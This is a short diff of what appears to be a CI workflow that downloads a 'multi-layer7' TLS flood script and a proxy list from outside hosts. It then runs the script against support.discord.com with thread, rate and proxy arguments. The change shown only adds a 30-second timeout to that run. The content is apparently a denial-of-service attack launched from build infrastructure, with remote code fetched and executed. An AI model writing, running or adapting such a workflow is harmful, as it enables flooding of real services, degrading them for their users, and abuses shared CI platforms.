@@ -17,7 +17,7 @@ jobs:
           wget https://github.com/kadinkatilii/multi-layer7/raw/refs/heads/main/AQUNET-TLS.js
           wgethttps://up.zip/9fpdq/proxies.txt
           npm i user-agents
-          node AQUNET-TLS.js https://support.discord.com/ 30 64 8 proxies.txt
+          timeout 30 node AQUNET-TLS.js https://support.discord.com/ 30 64 8 proxies.txt
           
       - name: OK !
         run: |
